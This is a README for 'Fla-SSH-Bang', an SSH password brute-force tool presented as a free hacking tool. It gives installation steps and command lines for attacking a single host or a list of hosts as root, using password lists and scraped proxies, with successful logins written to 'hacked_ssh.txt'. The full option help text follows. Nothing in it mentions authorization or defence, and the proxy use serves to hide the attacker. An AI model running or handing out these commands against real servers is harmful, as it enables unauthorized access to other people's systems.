# Fla-SSH-Bang
Lightspeed SSH bruteforce.

This tool is best combined with [Turbo](https://github.com/lilmond/Turbo/tree/main)

Watch flasshbang2 at play here: https://www.youtube.com/watch?v=J4gawRD-RDo

**PS:** The files `coolproxies.txt` and `passlist_2023.txt` are only samples of combo lists. You may use [Proxal](https://github.com/lilmond/Proxal) for fetching fresh proxy lists, and also don't forget to pull better password list from [SecLists](https://github.com/danielmiessler/SecLists).

https://discord.com/invite/Bnf3e8pkyj

follow me for more free hacking tools :3

![image](https://github.com/user-attachments/assets/a45ef85b-e9b7-4c2a-acf2-84d932df7186)

# Where to get proxies?
You may use my proxy list scraper here (Proxal): https://github.com/lilmond/Proxal

# Installation
Ubuntu 20.04
```
git clone https://github.com/lilmond/flasshbang
cd flasshbang
pip install -r requirements.txt
```
Ubuntu 24.04
```
git clone https://github.com/lilmond/flasshbang
cd flasshbang
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```

# Usage

## Examples
Single host target
```
python3 flasshbang.py <target ip> -u root -P samples/pass_list.txt -pp samples/good_proxies.txt 
```

Multi-hosts
```
python3 flasshbang.py -M <host list file> -u root -P samples/pass_list.txt -pp samples/good_proxies.txt -o hacked_ssh.txt 
```

# Help
```

               █████▒██▓    ▄▄▄        ██████   ██████  ██░ ██  ▄▄▄▄    ▄▄▄       ███▄    █   ▄████  ▐██▌
             ▓██   ▒▓██▒   ▒████▄    ▒██    ▒ ▒██    ▒ ▓██░ ██▒▓█████▄ ▒████▄     ██ ▀█   █  ██▒ ▀█▒ ▐██▌
             ▒████ ░▒██░   ▒██  ▀█▄  ░ ▓██▄   ░ ▓██▄   ▒██▀▀██░▒██▒ ▄██▒██  ▀█▄  ▓██  ▀█ ██▒▒██░▄▄▄░ ▐██▌
             ░▓█▒  ░▒██░   ░██▄▄▄▄██   ▒   ██▒  ▒   ██▒░▓█ ░██ ▒██░█▀  ░██▄▄▄▄██ ▓██▒  ▐▌██▒░▓█  ██▓ ▓██▒
             ░▒█░   ░██████▒▓█   ▓██▒▒██████▒▒▒██████▒▒░▓█▒░██▓░▓█  ▀█▓ ▓█   ▓██▒▒██░   ▓██░░▒▓███▀▒ ▒▄▄
              ▒ ░   ░ ▒░▓  ░▒▒   ▓▒█░▒ ▒▓▒ ▒ ░▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░▒▓███▀▒ ▒▒   ▓▒█░░ ▒░   ▒ ▒  ░▒   ▒  ░▀▀▒
              ░     ░ ░ ▒  ░ ▒   ▒▒ ░░ ░▒  ░ ░░ ░▒  ░ ░ ▒ ░▒░ ░▒░▒   ░   ▒   ▒▒ ░░ ░░   ░ ▒░  ░   ░  ░  ░
              ░ ░     ░ ░    ░   ▒   ░  ░  ░  ░  ░  ░   ░  ░░ ░ ░    ░   ░   ▒      ░   ░ ░ ░ ░   ░     ░
                        ░  ░     ░  ░      ░        ░   ░  ░  ░ ░            ░  ░         ░       ░  ░
                                                                     ░
                        Visit  https://github.com/lilmond for more free hacking tools! :3

usage: flasshbang.py [-h] [-p PORT] [-u USERNAME] -P PASSLIST -pp PROXY_LIST [-t THREADS] [-T THREADS_MULTI]
                     [-M HOST_LIST] [-o OUTPUT]
                     [hostname]

Fla-SSH-Bang! Inspired by vanhauser's hydra (also shoutout to him for creating that wonderful tool!). Super fast SSH
bruteforce tool powered by proxies that who knows where they came from. Written in Python! Number 1 language in the
world!

positional arguments:
  hostname              Target IP address.

options:
  -h, --help            show this help message and exit
  -p PORT, --port PORT  Target port. Default is set to 22.
  -u USERNAME, --username USERNAME
                        SSH user to attack. The default is set to root.
  -P PASSLIST, --passlist PASSLIST
                        Your favorite password list from SecLists!
  -pp PROXY_LIST, --proxy-list PROXY_LIST
                        Not the size of your penis, but the longer your proxy list is, the better!
  -t THREADS, --threads THREADS
                        Threads, idk how to explain what threads are. But the default is set to 10! The more threads,
                        the faster!
  -T THREADS_MULTI, --threads-multi THREADS_MULTI
                        Threads for multi hosts. The default is 3
  -M HOST_LIST, --host-list HOST_LIST
                        File list of hosts to attack.
  -o OUTPUT, --output OUTPUT
                        Success logins output file.
```
